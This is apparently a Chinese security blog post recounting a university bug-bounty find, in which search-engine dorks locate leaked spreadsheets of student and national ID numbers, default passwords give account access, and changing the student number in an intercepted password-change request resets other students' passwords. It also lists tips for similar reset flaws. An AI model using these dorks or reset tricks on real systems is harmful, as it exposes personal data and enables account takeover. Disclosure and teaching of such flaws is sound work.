      <url>2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>在挖EDUSRC的时候无意中点到的一个站点</p><p><img src="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/1.png"></p><p>当看到初始密码为8位生日的时候，立即想到了信息收集</p><h1 id="信息收集思路"><a href="#信息收集思路" class="headerlink" title="信息收集思路"></a>信息收集思路</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Site:xx.edu.cn filetype:xls 学号 身份证</span><br><span class="line">Site:xx.edu.cn xls 学号 身份证</span><br></pre></td></tr></table></figure><p>假如xls文件没有，可以尝试搜索其他文件</p><p>如：doc、docx、xlsx、pdf、zip、7z等等</p><p>在一波搜索下，终于找到了一处信息泄露，搜索到的是一处xls文件，带有学号和身份证等信息</p><p><img src="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/2.png"></p><p>拿到了身份证和学号，当即去尝试登录。对头，还是初始密码，成功登录</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p><img src="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/3.png"></p><p>可以查看个人敏感信息和账号任意操作，在看个人资料的那里尝试找了一下越权漏洞发现没有，就辗转到了修改密码的地方</p><p><img src="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/4.png"></p><p>填好密码，抓了一下包看看</p><p><img src="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/5.png"></p><p>可以看到带有学号，试想假如修改成别人的学号是不是能修改别人的密码呢，不多说开干</p><p><img src="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/6.png"></p><p>修改成了180068，然后发包</p><p><img src="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/7.png"></p><p>功夫不负有心人，修改成功，而且学号那里也变成了180068</p><p><img src="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/8.png"></p><p>只要抓包去跑一下，根据学号的排序规则，构造学号，可以修改全院学生的密码</p><h1 id="挖掘思路"><a href="#挖掘思路" class="headerlink" title="挖掘思路"></a>挖掘思路</h1><p>在挖掘密码重置漏洞的时候，主要是在密码修改处，注意它传的参数等，下面我举几个例子</p><h2 id="带有id等类似参数"><a href="#带有id等类似参数" class="headerlink" title="带有id等类似参数"></a>带有id等类似参数</h2><p><img src="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/9.png"></p><p>这里只要修改id，即可修改对方的密码。假如管理员的id是1，那么就可以修改管理员的密码了</p><h2 id="带有username等类似参数"><a href="#带有username等类似参数" class="headerlink" title="带有username等类似参数"></a>带有username等类似参数</h2><p><img src="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/10.png"></p><p>我在挖这个的时候，普通账号登录之后是可以看到管理员的用户名的，所以修改管理员的密码轻而易举。 </p><h2 id="验证码长期有效"><a href="#验证码长期有效" class="headerlink" title="验证码长期有效"></a>验证码长期有效</h2><p><img src="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/11.png"></p><p>只要抓包跑验证码，就可以修改对方的密码。</p><p><strong>圈子投稿文章，原文：<a href="https://www.secquan.org/Discuss/1070616">https://www.secquan.org/Discuss/1070616</a></strong></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> SRC </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
